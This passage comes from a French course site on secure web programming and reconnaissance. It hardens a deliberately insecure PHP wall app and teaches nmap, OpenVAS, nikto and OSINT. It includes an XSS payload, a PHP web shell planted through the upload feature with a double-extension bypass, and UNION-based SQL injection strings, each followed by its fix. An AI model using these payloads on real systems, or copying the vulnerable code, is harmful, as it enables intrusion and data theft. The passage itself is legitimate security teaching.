une page Web existante avec des donn\u00e9es fournies par l'utilisateur \u00e0 l'aide d'une API de navigateur permettant de cr\u00e9er du HTML ou du JavaScript. Le XSS permet aux attaquants d'ex\u00e9cuter des scripts dans le navigateur de la victime et ainsi de d\u00e9tourner des sessions utilisateurs, de d\u00e9figurer des sites Web ou de rediriger l'utilisateur vers des sites malveillants. A8:2017-D\u00e9s\u00e9rialisation non s\u00e9curis\u00e9e La d\u00e9s\u00e9rialisation non s\u00e9curis\u00e9e conduit souvent \u00e0 l'ex\u00e9cution de code arbitraire \u00e0 distance. M\u00eame si les failles de d\u00e9s\u00e9rialisation n'entra\u00eenent pas l'ex\u00e9cution de code distant, elles peuvent \u00eatre utilis\u00e9es pour effectuer d'autres attaques, notamment des attaques par rejeu, des attaques par injection et des attaques par \u00e9l\u00e9vation de privil\u00e8ges. A9:2017-Utilisation de composants pr\u00e9sentant des vuln\u00e9rabilit\u00e9s connues Les composants, tels que les biblioth\u00e8ques, frameworks et autres modules logiciels, fonctionnent avec les m\u00eames privil\u00e8ges que l'application. Si un composant vuln\u00e9rable est exploit\u00e9 par une attaque, cela peut entra\u00eener de graves pertes de donn\u00e9es ou la compromission du serveur. Les applications et les API utilisant des composants dont les vuln\u00e9rabilit\u00e9s sont connues peuvent compromettre leurs d\u00e9fenses et permettre diverses attaques et impacts. A10:2017-Journalisation &amp; Surveillance insuffisantes L'insuffisance de journalisation et de surveillance, coupl\u00e9e \u00e0 une int\u00e9gration avec la r\u00e9ponse aux incidents, inefficace ou absente, permet aux pirates d'attaquer des syst\u00e8mes de fa\u00e7on plus avanc\u00e9e, de maintenir la persistance, de basculer vers d'autres syst\u00e8mes, et de falsifier, extraire ou d\u00e9truire des donn\u00e9es. La plupart des \u00e9tudes de failles montrent que le temps n\u00e9cessaire pour d\u00e9tecter une faille est sup\u00e9rieur \u00e0 200 jours. G\u00e9n\u00e9ralement, cette faille est d\u00e9tect\u00e9e par des parties externes plut\u00f4t que par une surveillance ou des processus internes. <p>\u00c0 partir du cours d'aujourd'hui, nous allons prendre une application simple cod\u00e9e en PHP qui est ins\u00e9cure. \u00c0 chaque cours, nous allons modifier l'application pour la rendre plus s\u00e9curitaire.  </p>"},{"location":"lecons/Programmer_application_securisee/#monmur","title":"MonMur","text":"<p>MonMur est une application qui permet \u00e0 vos amis d'\u00e9crire des petits mots sur votre site Web. \u00c0 la fin du cours, MonMur aura les fonctionnalit\u00e9s suivantes :  </p> <ul> <li>Permettre d'\u00e9crire de mani\u00e8re anonyme</li> <li>Permettre de cr\u00e9er un compte pour voir et modifier les petits mots \u00e9crits auparavant  </li> <li>Permettre \u00e0 des administrateurs de visualiser les comptes utilisateurs, les supprimer et mod\u00e9rer les commentaires  </li> </ul>"},{"location":"lecons/Programmer_application_securisee/#permier-jet-de-monmur","title":"Permier jet de MonMur","text":"<pre><code>&amp;lt;?php\n// database.php sert \u00e0 interagir avec la base de donn\u00e9es\nrequire_once('database.php');\nrequire_once('commun.php');\n\nsession_start();\n\n$erreur = '';\n$commentaire = '';\n\n// Traiter l'image, s'il y a lieu\ntraiterImage($nom_image, $erreur);\n\n// Ajouter le commentaire \u00e0 la base de donn\u00e9es sauf s'il y a une erreur\nif(isset($_POST['commentaire'])) {\n  if($_POST['commentaire'] &amp;&amp; $_POST['commentaire'] != '') {\n    $commentaire = $_POST['commentaire'];\n    enregistrerCommentaire($commentaire, $nom_image, utilisateurCourant());\n    retourAuMur();\n    exit();\n  } else {\n    $erreur = 'Le commentaire est invalide. Veuillez r\u00e9essayer.';\n  }\n}\n\n// Dessiner l'interface utilisateur\n$html = debutHtml()\n . formulaireCommentaire(\"monmur.php\", $commentaire, 0, $erreur)\n . afficherCommentaires()\n . finHtml();\n\nprint $html;\n\nfunction afficherCommentaires(){\n\n  $resultats = listeCommentaires();\n\n  $monmur = '';\n\n  while($ligne = $resultats-&gt;fetch_assoc()){\n    $commentaire = trim($ligne[\"commentaire\"]);\n    // Remplacer les retour de chariot par l'\u00e9quivalent html\n    $commentaire = str_replace(\"\\n\", '&amp;lt;br/&gt;', $commentaire);\n    $commentaire_id = $ligne[\"commentaire_id\"];\n    $image = $ligne[\"image\"];\n    $code_utilisateur = trim($ligne[\"codeutilisateur\"]);\n\n    $monmur .= &lt;&lt;&lt;fin\n    &amp;lt;div class=\"commentaire\"&gt;\n      &amp;lt;div class=\"commentaire_entete\"&gt;\n        &amp;lt;div class=\"utilisateur\"&gt;{$code_utilisateur}&amp;lt;/div&gt;\n        &amp;lt;div class=\"commentaire_id\"&gt;{$commentaire_id}&amp;lt;/div&gt;\n      &amp;lt;/div&gt;\n      &amp;lt;div class=\"commentaire_texte\"&gt;{$commentaire}&amp;lt;/div&gt;\n    fin;\n\n    if(!empty($image)) {\n      $monmur .= \"&amp;lt;img src='/images/{$image}'/&gt;\";\n    }\n\n    // Afficher les actions seulement si c'est l'utilisateur qui est l'auteur\n    if($code_utilisateur == utilisateurCourant() &amp;&amp; utilisateurCourant() != ANON) {\n      $monmur .= &lt;&lt;&lt;fin\n      &amp;lt;div class=\"commentaire_pied\"&gt;\n        &amp;lt;div class=\"commentaire_action\"&gt;\n          &amp;lt;a href=\"modifier.php?id={$commentaire_id}\"&gt;Modifier&amp;lt;/a&gt;\n        &amp;lt;/div&gt;\n        &amp;lt;div class=\"commentaire_action\"&gt;\n          &amp;lt;a href=\"javascript:ConfirmerSupression({$commentaire_id})\"&gt;Supprimer&amp;lt;/a&gt;\n        &amp;lt;/div&gt;\n      &amp;lt;/div&gt;\n      fin;\n    }\n\n    $monmur .= \"&amp;lt;/div&gt;\";\n  }\n\n  return $monmur;\n}\n?&gt;\n</code></pre>"},{"location":"lecons/Programmer_application_securisee/#traitement-des-erreurs","title":"Traitement des erreurs","text":"<p>Le bon traitement des erreurs dans votre code est essentiel pour :  </p> <ul> <li>Que l'utilisateur ne pense pas qu'il a bris\u00e9 votre site Web d\u00e8s qu'une erreur survient  </li> <li>Les pirates utilisent le contenu des erreurs brutes comme source d'information</li> </ul>"},{"location":"lecons/Programmer_application_securisee/#conditions-limites","title":"Conditions limites","text":"<p>Un aspect important pour \u00e9viter les erreurs est de se pr\u00e9venir contre ce que l'utilisateur peut saisir dans notre page qui ne devrait pas y \u00eatre.  </p> <p>Exemples de conditions limites : - Entr\u00e9e vide - Caract\u00e8res de contr\u00f4le - Caract\u00e8res non-alphanum\u00e9riques - Entr\u00e9e excessivement grande - Donn\u00e9es binaires - Entr\u00e9e dans une autre page de code (UTF-8, ASCII, etc.)   - Injection SQL - Injection de code - XSS   </p> <p>Important</p> <p>La r\u00e8gle d'or lors de l'\u00e9criture des conditions limites est de refuser tout ce qui est suspicieux.  </p>"},{"location":"lecons/Programmer_application_securisee/#mecanisme-de-traitement-des-erreurs","title":"M\u00e9canisme de traitement des erreurs","text":"<p>Pour s'assurer que toutes les entr\u00e9es \u00e0 votre application Web aient la m\u00eame gestion d'erreurs, il est recommand\u00e9 de b\u00e2tir un m\u00e9canisme de traitement des erreurs. Ce m\u00e9canisme sera utilis\u00e9 \u00e0 travers l'application.  Deux raisons :  </p> <ul> <li>\u00c7a \u00e9vite des oublis  </li> <li>C'est consistant  </li> </ul> <p>Dans votre application, certains choix devrons \u00eatre faits. Est-ce que l'application devrait accepter le code HTML dans les commentaires?  D'un c\u00f4t\u00e9, ce peut \u00eatre int\u00e9ressant pour les utilisateurs de mettre en gras son commentaire, mais accepter le HTML ouvre la porte aux pirates.  </p> <p>Pour enlever le code HTML d'une entr\u00e9e :  </p> <pre><code>$texte_a_nettoyer = \"Tu es &amp;lt;em&gt;le&amp;lt;/em&gt; meilleur!\";\n$texte_propre = strip_tags($texte_a_nettoyer);\n</code></pre> <p>$texte_propre aura la valeur \"Tu es le meilleur!\".</p> <p>Au lieu de permettre le HTML pour formater les commentaires, il est possible d'utiliser un autre langage tel que Markdown. Il y a un module PHP qui aide pour \u00e7a :  </p> <p>ParseDown sur GitHub </p> <pre><code>$Parsedown = new Parsedown();\n\n$Parsedown-&gt;setSafeMode(true);\n\n$commentaire = $Parsedown-&gt;text($ligne[\"commentaire\"]);\n</code></pre> <p>Si c'est important pour vous de permettre le HTML, privil\u00e9giez l'utilisation d'un module tel que celui-ci :  </p> <p>HTML purifier </p> <p>Testons MonMur :  </p> <p>Caract\u00e8res de contr\u00f4le : <pre><code>\"\n</code></pre></p> <p>Comment le corriger : <pre><code>$commentaire = addslashes($commentaire);\n</code></pre></p> <p>Commentaire trop long : <pre><code>Da Da, ooooh  \nWell, my friends, the time has come  \n(To) raise the roof and have some fun  \nThrow away the work to be done  \nLet the music play on...(Play on, play on, play on.)  \nEverybody sing, everybody dance  \nLose yourself in wild romance  \nWe're going to Party, Karamu, Fiesta, forever  \nCome on and sing along!  \nWe're going to Party, Karamu, Fiesta, forever  \nCome on and sing along!  \n\nAll night long (all night), All night (all night)  \nAll night long (all night), All night (all night)  \nAll night long (all night), All night (all night)  \nAll night long! (all night), Ooh, yeah (all night)  \n\nPeople dancing all in the street  \nSee the rhythm all in their feet  \nLife is good, wild and sweet  \nLet the music play on...(Play on, play on, play on...)  \nFeel it in your heart and feel it in your soul  \nLet the music take control  \nWe're going to Party, Liming, Fiesta, forever  \nCome on and sing along  \nWe're going to Party, Liming, Fiesta, forever  \nCome on and sing my song!  \n\nAll night long (all night), oooh, (all night)  \nAll night long (all night), yeaz, (all night)  \nAll night long (all night), yeah, (all night)  \nAll night long (all night)...(all night)  \n\nYeah, once you get started you can't sit down  \nCome join the fun, it's a merry-go-round  \nEveryone's dancing their troubles away  \nCome join our party, See how we play!  \n\n[Chant}  \nTam bo li de say de moi ya  \nHey Jambo Jumbo  \nWay to parti o we goin'  \nOh, jambali  \nTam bo li de say de moi ya  \nYeah, Jambo, jumbo  \n\nOh, O, O, O, yes  \nWe're going to have a party! (Yeah... ugh)  \n\nAll night long (all night), All night, (all night)  \nAll night long (all night), All night, (all night)  \nAll night long (all night), All night, (all night)  \nAll night long (all night)...(ugh)  \n\nWe're going to Party, Kalamu, Fiesta, forever  \nCome on and sing along!  \nWe're going to Party, Kalamu, Fiesta, forever  \nCome on and sing my song!  \n\nAll night long (all night), All night, (all night)  \nAll night long (all night), All night, (all night)  \nAll night long (all night), All night, (all night)  \nAll night long (all night)...(ugh)  \n\nAll night, (all night), All night, (all night),  \nAll night, (all night), All night, (all night),  \nAll night, (all night), All night, (all night),  \nAll night, (all night), Ugh, (all night),  \n\nEveryone you meet (all night)  \nThey're jamming in the street (all night)  \nAll night long! (All night)  \nYeah, I said, (All night)  \nEveryone you meet (All night)  \nThey're jamming in the street (All night)  \nAll night long! (All night)  \nFeel good! Feel good! (All night)  \n(All night to fade)  \n</code></pre></p> <p>All Night long - Rhett and Link </p> <p>Comment corriger :  </p> <p>Deux choix :  </p> <p>Couper le commentaire \u00e0 la longueur maximale du champ de la base de donn\u00e9es : <pre><code>$commentaire = substr($commentaire, 0, 1000);\n</code></pre></p> <p>OU  </p> <p>Afficher un message d'erreur que le commentaire est trop long : <pre><code>if(mb_strlen($_POST['commentaire']) &lt;= 1000) {\n  $commentaire = $_POST['commentaire'];\n  enregistrerCommentaire($commentaire, $nom_image, utilisateurCourant());\n  retourAuMur();\n  exit();\n} else {\n    $erreur = 'Le commentaire est trop long. Veuillez r\u00e9essayer.';\n}\n</code></pre></p> <p>XSS :  </p> <pre><code>&amp;lt;script&gt;alert('Doh!')&amp;lt;/script&gt;\n</code></pre> <p>Comment corriger :  </p> <ul> <li>En enlevant les tags html compl\u00e8tement  </li> <li>En utilisant un module qui transforme le commentaire \u00e0 l'affichage (voir ParseDown)  </li> <li>En utilisant un module qui fait du m\u00e9nage s\u00e9lectif (voir HTML purifier)  </li> </ul>"},{"location":"lecons/Programmer_application_securisee/#televersement-de-fichiers","title":"T\u00e9l\u00e9versement de fichiers","text":"<p>L'application MonMur permet de t\u00e9l\u00e9verser des images pour les commentaires. Un pirate peut abuser de cette fonctionnalit\u00e9 pour injecter du code PHP dans le serveur pour en prendre possession.</p> <p>T\u00e9l\u00e9versons un fichier nomm\u00e9 liste.php :  </p> <pre><code>&amp;lt;html&gt;&amp;lt;body&gt;\n&amp;lt;?php echo str_replace(\"\\n\", '&amp;lt;br/&gt;',shell_exec(\"ls /etc/\"));?&gt;\n&amp;lt;/body&gt;&amp;lt;/html&gt;\n</code></pre> <p>MonMur copie les images dans le r\u00e9pertoire <code>/images</code>.  Donc, on peut maintenant ex\u00e9cuter le code dans la barre d'adresse : <code>http://192.168.2.222/images/liste.php</code> </p> <p>R\u00e9sultat de liste.php</p> <p> </p> <p>Il faut donc limiter les formats de fichier \u00e0 accepter.  </p> <p>Commen\u00e7ons par interdire les fichiers avec l'extension .php :  </p> <pre><code>if (substr($image_cible,-3) == 'php') {\n  $nom_image = '';\n  $erreur = 'Ceci n\\'est pas une image!';\n  return 0;\n}\n</code></pre> <p>On ne peut plus t\u00e9l\u00e9verser liste.php. Utilisons le bon vieux truc de la double extension et renommons le fichier <code>liste.php.jpg</code>.  </p> <p>Le logiciel accepte sans probl\u00e8me le fichier qui peut \u00eatre ex\u00e9cut\u00e9 comme suit : <code>http://192.168.2.222/images/liste.php.jpg</code> </p> <p>La magie de ceci est une configuration du serveur qui permet d'ex\u00e9cuter tout script qui a la mention php dans son nom :  </p> <pre><code>&amp;lt;FilesMatch \".+\\.ph(ar|p|tml)\"&amp;gt;\n    SetHandler application/x-httpd-php\n&amp;lt;/FilesMatch&amp;gt;\n&amp;lt;FilesMatch \".+\\.phps\"&gt;\n    SetHandler application/x-httpd-php-source\n    # Deny access to raw php sources by default\n    # To re-enable it's recommended to enable access to the files\n    # only in specific virtual host or directory\n    Require all denied\n&amp;lt;/FilesMatch&gt;\n# Deny access to files without filename (e.g. '.php')\n&amp;lt;FilesMatch \"^\\.ph(ar|p|ps|tml)\"&gt;\n    Require all denied\n&amp;lt;/FilesMatch&gt;\n</code></pre> <p>Corrigeons la configuration (le $ \u00e0 la fin du regex indique que c'est \u00e0 la fin du nom du fichier, donc .php accept\u00e9, .php.jpg ne l'est pas.):  </p> <pre><code>&amp;lt;FilesMatch \".+\\.ph(ar|p|tml$)\"&gt;\n    SetHandler application/x-httpd-php\n&amp;lt;/FilesMatch&gt;\n&amp;lt;FilesMatch \".+\\.phps$\"&gt;\n    SetHandler application/x-httpd-php-source\n    # Deny access to raw php sources by default\n    # To re-enable it's recommended to enable access to the files\n    # only in specific virtual host or directory\n    Require all denied\n&amp;lt;/FilesMatch&gt;\n# Deny access to files without filename (e.g. '.php')\n&amp;lt;FilesMatch \"^\\.ph(ar|p|ps|tml)$\"&gt;\n    Require all denied\n&amp;lt;/FilesMatch&gt;\n</code></pre>"},{"location":"lecons/Programmer_application_securisee/#lectures-supplementaires","title":"Lectures suppl\u00e9mentaires","text":"<p>Documentation de MarkDown Pirater les fichiers t\u00e9l\u00e9vers\u00e9s OWASP_Top_Ten</p>"},{"location":"lecons/Programmer_application_securisee/#testez-vos-connaissances","title":"Testez vos connaissances","text":"<p>Petit quiz sur la programmation s\u00e9curis\u00e9e </p>"},{"location":"lecons/Protection_Injection_SQL/","title":"Protection contre les injections SQL","text":""},{"location":"lecons/Protection_Injection_SQL/#injection","title":"Injection","text":"<p>OWASP_Injection</p> <p>Avant de prot\u00e9ger notre application, testons la possibilit\u00e9 d'injecter du SQL.  </p> <p>La place la plus probable est l'outil de recherche.  </p> <p>Essayons ceci :  <code>' and 1=0 Union select 1,2,3,4 #</code></p> <p>On voit ici que le champ 3 correspond \u00e0 l'image, peu utile pour notre test.</p> <p>Essayons ceci :  <code>' and 1=0 Union select database(), version(), null, user() #</code></p> <p>C'est clair que notre application Web est susceptible \u00e0 une attaque par injection SQL.  </p> <p>Examinons pourquoi notre application est vuln\u00e9rable. Prenons le code qui interroge la base de donn\u00e9es :  </p> <pre><code>function listeCommentaires($criteres_recherche){\n  $conn = creerConnexion();\n  $requete = \"SELECT commentaire_id, commentaire, image, codeutilisateur FROM monmur WHERE commentaire like '$criteres_recherche' ORDER BY commentaire_id DESC\";\n\n  return $conn-&gt;query($requete);\n}\n</code></pre> <p>Lorsque nous injectons notre SQL, par exemple <code>' and 1=0 Union select database(), version(), null, user() #</code>, la variable <code>$requete</code> contient la requ\u00eate suivante : <code>SELECT commentaire_id, commentaire, image, codeutilisateur FROM monmur WHERE commentaire like '' and 1=0 Union select database(), version(), null, user() #'</code></p> <p>Ex\u00e9cutons la requ\u00eate dans MySQL</p> <p> </p>"},{"location":"lecons/Protection_Injection_SQL/#se-proteger-des-injections","title":"Se prot\u00e9ger des injections","text":"<p>Au lieu de composer la requ\u00eate en manipulant la cha\u00eene de caract\u00e8res, MySQLi \u00e0 un outil de pr\u00e9paration de requ\u00eate :  </p> <pre><code>$requete = $dbConnection-&gt;prepare('SELECT * FROM utilisateurs WHERE nom = ?');\n$requete-&gt;bind_param('s', $nom);  // 's' sp\u00e9cifie que le type =&gt; 'string'\n$requete-&gt;execute();\n</code></pre> <p>Donc, pour notre fonction ListeCommentaires :  </p> <pre><code>function listeCommentaires($criteres_recherche){\n  $conn = creerConnexion();\n  $requete = $conn-&gt;prepare(\"SELECT commentaire_id, commentaire, image, codeutilisateur FROM monmur WHERE commentaire like ? ORDER BY commentaire_id DESC\");\n  $requete-&gt;bind_param('s', $criteres_recherche);\n  $requete-&gt;execute();\n  return $requete-&gt;get_result();\n}\n</code></pre>"},{"location":"lecons/Protection_Injection_SQL/#proteger-la-base-de-donnees","title":"Prot\u00e9ger la base de donn\u00e9es","text":""},{"location":"lecons/Protection_Injection_SQL/#table-des-droits-de-mysql","title":"Table des droits de MySQL","text":"Privil\u00e8ge Contexte select tables insert tables update tables delete tables index tables alter tables create base de donn\u00e9es, tables, ou indexes drop base de donn\u00e9es ou tables grant base de donn\u00e9es ou tables references base de donn\u00e9es ou tables reload administration de serveur shutdown administration de serveur process administration de serveur file Acc\u00e8s aux fichiers du serveur <p>Il est facile pour un d\u00e9veloppeur de donner tous les droits \u00e0 un utilisateur de bd comme suit :  </p> <pre><code>CREATE USER 'monmur'@'localhost' IDENTIFIED BY 'cegep2020';\nGRANT ALL PRIVILEGES ON *.* TO 'monmur'@'localhost';\n</code></pre> <p>Cependant, c'est tr\u00e8s dangereux.  Si quelqu'un a acc\u00e8s au code utilisateur, il peut tout faire, incluant ceci :  </p> <pre><code>DROP DATABASE IF EXISTS monmur;\n</code></pre> <p>Il faut donc utiliser un utilisateur avec le minimum de droits possible pour le bon fonctionnement de l'application.  </p> Privil\u00e8ge minimum Raison select Pour lire les tables insert Pour ins\u00e9rer les commentaires et les codes utilisateurs update Pour mettre \u00e0 jour un commentaire delete Pour supprimer un commentaire ou un code utilisateur <p>Il faut aussi restreindre le code utilisateur \u00e0 la base de donn\u00e9es de l'application seulement.  </p> <p>Pour notre application, le script de cr\u00e9ation d'utilisateur ressemblerait \u00e0 ceci :  </p> <pre><code>CREATE USER 'monmur'@'localhost' IDENTIFIED BY 'cegep2020';\nGRANT SELECT, INSERT, UPDATE, DELETE ON 'monmur'.* TO 'monmur'@'localhost';  \n</code></pre> <p>Pour augmenter la s\u00e9curit\u00e9 encore plus, ce serait d'utiliser plusieurs utilisateurs, selon la section de l'application.  Par exemple :  </p> Page Droit minimal monmur.php select, insert de la table commentaires login.php select de la table utilisateurs modifier.php select, update de la table commentaires <p>Il serait possible de cr\u00e9er plusieurs utilisateurs et les utiliser ad\u00e9quatement dans l'application.  </p>"},{"location":"lecons/Protection_Injection_SQL/#lecture-supplementaires","title":"Lecture suppl\u00e9mentaires","text":"<p>SQLi et PHP - Cheat Sheet PHP Security </p>"},{"location":"lecons/Protection_Injection_SQL/#testez-vos-connaissances","title":"Testez vos connaissances","text":"<p>Petit quiz sur la protection d'injection SQL </p>"},{"location":"lecons/Reconnaissance_active/","title":"Reconnaissance active","text":""},{"location":"lecons/Reconnaissance_active/#reconnaissance-active-avec-nmap","title":"Reconnaissance active avec nmap","text":"<p>Nous allons activement se connecter aux actifs, soit avec des ping, soit des balayages de ports. Ceci peut activer des alarmes du c\u00f4t\u00e9 de la cible.</p>"},{"location":"lecons/Reconnaissance_active/#decouverte-dactifs-avec-nmap","title":"D\u00e9couverte d\u2019actifs avec nmap","text":"<p>Nmap (network mapping) peut d\u00e9couvrir quels actifs se retrouvent dans un r\u00e9seau</p> <p>Utilise le ICMP Ping</p> <p><code>nmap -sn 192.168.40.0/24</code></p> <p>Le drapeau \u2013sn sert \u00e0 faire un simple ping pour chaque adresse de la plage s\u00e9lectionn\u00e9e.</p>"},{"location":"lecons/Reconnaissance_active/#decouverte-de-services-dun-actif","title":"D\u00e9couverte de services d'un actif","text":"<p>Nmap (network mapping) peut d\u00e9couvrir quels services (ports) sont ouverts chez la cible.</p> <p>Une des m\u00e9thodes de nmap pour d\u00e9couvrir les services d'un actif est de faire une connexion compl\u00e8te TCP. Le diagramme suivant explique l'\u00e9tablissement de la connexion en trois \u00e9tapes.</p> <p>Transaction TCP</p> <p> 3-way handshake</p> <p>Pour balayer un actif :</p> <p><code>nmap -sT 192.168.40.2</code></p> <p>Le drapeau \u2013sT fait une connection compl\u00e8te (SYN,SYN/ACK,ACK) sur tous les ports de la cible</p> <p>Pour un balayage plus rapide, on peut faire un balayage \u00e0 demi ouvert. On ne termine pas la connexion en trois \u00e9tapes.</p> <p> </p> <p> L'actif 1 ne termine pas la connexion.</p> <p><code>nmap -sS 192.168.40.2</code></p> <p>Le drapeau \u2013sS fait une connection incompl\u00e8te (SYN,SYN/ACK) sur tous les ports de la cible</p> <p>Autres drapeaux int\u00e9ressants :</p> <ul> <li>-vv pour verbose (information plus d\u00e9taill\u00e9e)</li> <li>-T4 pour acc\u00e9l\u00e9rer le balayage</li> <li>-A pour d\u00e9tection de l'OS et autres scripts de d\u00e9tection</li> <li>-Pn prend pour acquis que le serveur est disponible. (Ne fait pas la d\u00e9couverte avec un ICMP ping)</li> </ul> <p><code>nmap -sS -vv -A -T4 192.168.40.2</code></p>"},{"location":"lecons/Reconnaissance_active/#determiner-le-systeme-dexploitation-dun-actif","title":"D\u00e9terminer le syst\u00e8me d'exploitation d'un actif","text":"<p>Nmap (network mapping) peut deviner quel OS roule sur la cible.</p> <p>Utilise l\u2019empreinte digitale de la cible.</p> <p><code>nmap -sS -O 192.168.40.2</code></p> <p>Le drapeau \u2013O essaie de deviner l\u2019OS de la cible selon les ports ouverts et leur r\u00e9ponse.</p>"},{"location":"lecons/Reconnaissance_active/#decouverte-active-avec-openvas","title":"D\u00e9couverte active avec OpenVAS","text":"<p>OpenVAS est un outil qui d\u00e9tecte toutes les vuln\u00e9rabilit\u00e9s connues et document\u00e9es des actifs balay\u00e9s.</p> <p>Pour installer OpenVAS :</p> <p>Voir la proc\u00e9dure d'installation. </p>"},{"location":"lecons/Reconnaissance_active/#demarrer-un-balayage","title":"D\u00e9marrer un balayage","text":"<p>Aller dans le menu Scan, puis l'option Tasks.</p> <p></p> <p>Cliquer sur l'\u00e9toile et choisir New Task.</p> <p></p> <p>Dans la fiche, cliquer sur l'\u00e9toile pour ajouter une cible</p> <p></p> <p>Dans la fiche de la nouvelle cible, entrer le nom et son adresse IP</p> <p></p> <p>Balayage cr\u00e9\u00e9</p> <p></p> <p>D\u00e9marrer le balayage</p> <p></p> <p>Attendre que le balayage se termine</p> <p></p>"},{"location":"lecons/Reconnaissance_active/#interpreter-les-resultats","title":"Interpr\u00e9ter les r\u00e9sultats","text":"<p>OpenVAS donne beaucoup d'information sur les vuln\u00e9rabilit\u00e9s trouv\u00e9es :</p> <p>Liste</p> <p></p> <p>D\u00e9tails</p> <p> 1. Le sommaire donne un r\u00e9sum\u00e9 de la vuln\u00e9rabilit\u00e9 2. Le r\u00e9sultat indique comment la vuln\u00e9rabilit\u00e9 a \u00e9t\u00e9 trouv\u00e9e 3. La solution est ce qu'il faut faire pour se prot\u00e9ger 4. \u00c7a donne un peut plus d'information sur l'attaque possible 5. Des informations sur le module d'OpenVAS qui a fait la d\u00e9tection  </p> <p>Autres d\u00e9tails (selon les vuln\u00e9rabilit\u00e9s)</p> <p></p> <p>Parfois vous verrez une r\u00e9f\u00e9rence \u00e0 un CVE (Common Vulnerabilities and Exposures). La liste officielle est celle du MITRE.</p> <p>Attention</p> <p>Si vous \u00eates en charge de la s\u00e9curit\u00e9 de la compagnie, il est tr\u00e8s important de r\u00e9gler les entr\u00e9es de OpenVAS de 7 et plus de s\u00e9v\u00e9rit\u00e9.</p>"},{"location":"lecons/Reconnaissance_active/#decouverte-dapplication-web-avec-nikto","title":"D\u00e9couverte d'application Web avec nikto","text":"<p>Nikto est un engin de balayage de serveurs web qui ex\u00e9cute des tests complets, dont 6500 fichiers potentiellement dangereux, \u00e9value les version qui ne sont pas \u00e0 jour de plus de 1250 serveurs et des probl\u00e8mes sp\u00e9cifiques de plus de 270 serveurs.</p> <p>Pour balayer un serveur Web avec Nikto :</p> <p><code>nikto -h 192.168.40.7</code></p> <p>Voici un exemple de r\u00e9sultat</p> <p> (Dans ce cas-ci, c'est notre machine Metasploitable)</p> <p>Voici un autre exemple, cette fois-ci un serveur sur un Raspberry PI</p> <p></p> <p>Nikto donne des r\u00e9f\u00e9rences \u00e0 OSVDB (une base de donn\u00e9es qui a ferm\u00e9 en 2016). Si vous voulez le CVE correspondant, utilisez cette page de correspondance.</p>"},{"location":"lecons/Reconnaissance_active/#testez-vos-connaissances","title":"Testez vos connaissances","text":"<p>Petit quiz sur la reconnaissance active </p>"},{"location":"lecons/Reconnaissance_passive/","title":"Reconnaissance passive","text":"<p>Deux types de reconnaissance :</p> <ul> <li>Reconnaissance active</li> <li>Reconnaissance passive</li> </ul>"},{"location":"lecons/Reconnaissance_passive/#reconnaissance-passive_1","title":"Reconnaissance passive","text":"<p>La reconnaissance passive est toute activit\u00e9 qui n'envoie pas d'information \u00e0 la cible.</p>"},{"location":"lecons/Reconnaissance_passive/#ingenierie-sociale","title":"Ing\u00e9nierie sociale","text":"<p>La reconnaissance passive est essentielle pour une attaque d'ing\u00e9nierie sociale. L'ing\u00e9nierie sociale est une forme de piratage o\u00f9 le pirate cherche \u00e0 convaincre un \u00eatre humain de faire une action lui permettant de prendre contr\u00f4le d'un syst\u00e8me ou collecter des informations confidentielles.  </p>"},{"location":"lecons/Reconnaissance_passive/#outils-dintelligence-du-domaine-public","title":"Outils d'intelligence du domaine public","text":"<p>Appell\u00e9s OSINT (Open Source Intelligence), les outils d'intelligence du domaine public regorge d'information qui permettent \u00e0 un pirate de bien conna\u00eetre sa cible. Lors de la reconnaissance passive, il est essentiel de bien conna\u00eetre les syst\u00e8mes informatiques de la cible, mais aussi d'en conna\u00eetre les personnes qui forment l'entreprise.  </p> <p>Important</p> <p>Il est beaucoup plus facile de pirater une entreprise \u00e0 travers ses employ\u00e9s que via leurs syst\u00e8mes.  </p> <p>Quelques outils pour d\u00e9couvrir de l'information sur une entreprise et ses employ\u00e9s :  </p> Outil Utilit\u00e9 LinkedIn On peut voir facilement la liste des employ\u00e9s d'une entreprise Registre des entreprise (Qu\u00e9bec) Donne de l'information sur l'entreprise, incluant le nom du propri\u00e9taire et possiblement des adresses CanLII Tous les documents des tribunaux canadiens Ancestry Pour trouver des informations sur les membres de la famille, mariages, divorces, etc."},{"location":"lecons/Reconnaissance_passive/#recherche-de-sous-domaines","title":"Recherche de sous-domaines","text":"<p>Souvent, les sous-domaines sont des serveurs dans la DMZ de l\u2019entreprise, bons points d\u2019entr\u00e9es dans le r\u00e9seau.</p> <p>Outils utilis\u00e9s :</p> <p>DNS Dumpster</p> <p>NMMapper's Subdomain Finder</p>"},{"location":"lecons/Reconnaissance_passive/#recherche-par-certificats-emis","title":"Recherche par certificats \u00e9mis","text":"<p>Pour trouver l'adresse IP du nom de domaine :</p> <p><code>nslookup aeti.cegepvicto.ca</code></p> <p>Pour trouver de l'information sur le propri\u00e9taire de l'adresse IP :</p> <p><code>whois 206.167.10.37</code></p> <p>Pour avoir plus d'information, censys.io peut aider :</p> <p>censys.io search</p>"},{"location":"lecons/Reconnaissance_passive/#spiderfoot","title":"SpiderFoot","text":"<p>SpiderFoot est un outil qui automatise la reconnaissance passive. Pour l'utiliser :</p> <p><code>cd /usr/share/spiderfoot</code></p> <p><code>python3 ./sf.py -l 127.0.0.1:5009</code></p> <p>Ouvrir le fureteur de Kali \u00e0 cette adresse : http://127.0.0.1:5009</p>"},{"location":"lecons/Reconnaissance_passive/#recon-ng","title":"Recon-ng","text":"<p>Recon-ng est une plateforme modulaire pour la reconnaissance. Bas\u00e9e sur les m\u00eames principes que MetaSploit, cet plateforme regroupe beaucoup d'outils pour aider \u00e0 faire de la reconnaissance.</p> <p>Pour d\u00e9marrer :</p> <p><code>recon-ng</code></p> <p>L'outil recueille ses r\u00e9sultats dans des espaces de travail. Pour cr\u00e9er un espace, par exemple pour le c\u00e9gep :</p> <p><code>workspaces create cegep</code></p> <p>la commande db permet d'interagir avec la base de donn\u00e9es de l'espace de travail. Par exemple, pour ajouter le domaine du c\u00e9gep :</p> <p><code>db insert domains</code></p> <p>Renseigner les champs :</p> <p><code>domain (TEXT) : cegepvicto.ca</code></p> <p><code>Note (TEXT) : C\u00e9gep de Victoriaville</code></p> <p>Ajouter le c\u00e9gep comme compagnie :</p> <p><code>db insert companies</code></p> <p>Renseigner les champs :</p> <p><code>company (TEXT) : Cegep de Victoriaville</code></p> <p>Les modules de recon-ng sont accessibles via le marketplace.</p> <p>Pour rechercher un module :</p> <p><code>marketplace search whois</code></p> <p>Retourne la liste des modules relatifs aux domaines.</p> <p>Pour installer un module :</p> <p><code>marketplace install recon/companies-multi/whois_miner</code></p> <p>Pour utiliser un module :</p> <p><code>modules load whois_miner</code></p> <p>Pour avoir de 